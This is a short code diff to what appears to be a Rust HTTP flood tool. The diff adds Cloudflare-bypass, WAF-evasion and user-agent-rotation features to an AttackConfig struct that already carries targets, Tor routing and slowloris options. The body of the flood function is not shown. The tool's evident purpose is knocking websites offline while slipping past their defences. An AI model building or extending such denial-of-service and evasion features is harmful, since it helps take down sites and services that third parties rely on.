@@ -8,6 +8,7 @@ use std::time::Duration;
 use tokio::time::{interval, sleep};
 use tokio::net::TcpStream;
 use tokio::io::AsyncWriteExt;
+use crate::evasion::{cloudflare::CloudflareBypass, waf::WafEvasion, useragent::UserAgentDatabase};
 
 pub struct AttackConfig {
     pub targets: Vec<String>,
@@ -17,6 +18,8 @@ pub struct AttackConfig {
     pub method: String,
     pub use_tor: bool,
     pub slowloris: bool,
+    pub cloudflare_bypass: bool,
+    pub waf_evasion: bool,
 }
 
 pub async fn http_flood(config: AttackConfig) -> Result<()> {
